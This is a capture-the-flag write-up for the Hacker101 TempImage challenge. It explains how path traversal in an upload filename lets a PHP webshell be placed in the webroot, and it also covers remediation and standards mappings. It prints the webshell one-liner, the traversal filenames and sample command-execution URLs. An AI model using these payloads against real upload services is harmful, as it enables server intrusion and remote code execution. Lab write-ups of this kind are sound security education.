# TempImage: Writeup (2/2)

**Difficulty:** Moderate  
**Category:** Web (File Upload, Path Traversal, PHP RCE)  
**Flags:** 2/2 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

**Context:** A PHP temporary image hosting service. The user uploads a PNG, receives a random URL to share. The server renames the file with an MD5 hash but does not sanitize the `filename` parameter in the multipart form.

**What you face:** An apparently simple upload service. The challenge is to escape the upload directory and place an executable PHP file in the webroot.

**Vulnerabilities exploited:**
- Path Traversal (CWE-22) in the `filename` parameter of the multipart upload: `../` or `../../` in the filename
- Unrestricted File Upload (CWE-434): upload of a PHP webshell with modified extension via Burp
- Remote Code Execution via webshell: system access after successful upload

**What you learn:**
- The `filename` in the `Content-Disposition` header is client-controlled and must be sanitized before use as a path
- Renaming the file with MD5 protects against conflicts but not against path traversal in the original name
- Uploads must not be served as executables: use a separate directory without PHP execution permission
- `../` + `.php` extension = webshell in web directory: a combination of path traversal and unrestricted upload
- Intercepting and modifying requests in Burp Suite is the core technique for exploiting uploads

---

## Objective

Exploit file upload vulnerabilities to gain server access via path traversal and PHP webshell.

## Prerequisites

- Active TempImage instance
- Burp Suite or similar HTTP interception tool
- Any HTTP client

---

## Flag 0: Path Traversal on Upload

**Vulnerability:** Missing sanitization of the `filename` parameter in the upload.

### Step 1: Explore the normal upload

The application accepts only PNG files and renames them with an MD5 hash. Backend is PHP.

### Step 2: Intercept and modify the request

Use Burp Suite to intercept the upload of a legitimate PNG. In the Repeater, modify the `filename` to:

```
../../cat php
```

### Step 3: Obtain Flag 0

The path traversal in the filename causes the file to be written outside the expected directory, revealing the first flag.

---

## Flag 1: PHP Webshell via Upload + Path Traversal

**Combined vulnerability:** File type validation bypass + path traversal to place an executable PHP file in the web directory.

### Step 1: Create the PHP webshell

Create a PHP file with webshell content:

```php
<?php system($_GET['cmd']); ?>
```

### Step 2: Upload via path traversal

Use Burp Suite to send the webshell with filename:

```
/../../test.php
```

This causes the server to save the file as `test.php` in a web-accessible directory.

### Step 3: Execute commands remotely

Access the webshell via browser:

```
https://<INSTANCE>/test.php?cmd=ls
https://<INSTANCE>/test.php?cmd=cat%20index.php
```

The content of `index.php` contains the second flag embedded in the source code.

---

## Technical Summary

| Vector | Result |
|--------|--------|
| Path traversal in filename | Flag 0 exposed |
| PHP upload via path traversal | Webshell in web directory |
| RCE via webshell | Read index.php with Flag 1 |

---

## Lessons Learned

1. **Filename validation is critical**: `../` and absolute paths must be rejected
2. **Extension-based type validation is insufficient**: the extension can be manipulated during upload
3. **Uploads must not be served as executables**: upload directories should have `noexec`
4. **Path traversal + upload = RCE**: lethal combination when both are present

## Remediation

- Sanitize the `filename` by removing path separators (`../`, `/`)
- Validate type by content-type and "magic number" (file bytes), not just extension
- Store uploads outside the webroot or in a directory without execution permission
- Rename files on the server (MD5 was done, but extension must be forced to non-executable)

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 |
| Collection | Data from Local System | T1005 |

---

## OWASP Top 10 2021

- **A04:2021 Insecure Design**: no server-side restriction on file types or upload paths
- **A01:2021 Broken Access Control**: path traversal allows writing files outside the upload directory

## MITRE D3FEND Countermeasures

- **D3-FE (File Encryption)**: encrypt uploaded files at rest to prevent direct execution
- **D3-PSEP (Process Segment Execution Prevention)**: disable script execution in upload directories
- **D3-FCR (File Content Rules)**: validate uploaded file content by magic bytes, not extension

## NIST CSF 2.0

- **Protect (PR.DS)**: restrict file upload locations and validate filenames server-side
- **Detect (DE.CM)**: monitor for new executable files appearing in web-accessible directories
- **Respond (RS.MI)**: isolate and remove webshells immediately upon detection

## NIST SP 800-53 Rev. 5

- **SI-10 (Information Input Validation)**: sanitize filenames to remove traversal sequences
- **CM-7 (Least Functionality)**: disable PHP/script execution in upload directories
- **AC-3 (Access Enforcement)**: restrict write access to web-accessible directories
- **SI-3 (Malicious Code Protection)**: scan uploaded files for malicious content

---

Thanks guys!! (❍ᴥ❍ʋ)

---

File upload plus path traversal is the express lane to RCE. If you learned something new about why filename sanitization matters, tag someone who builds upload features.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
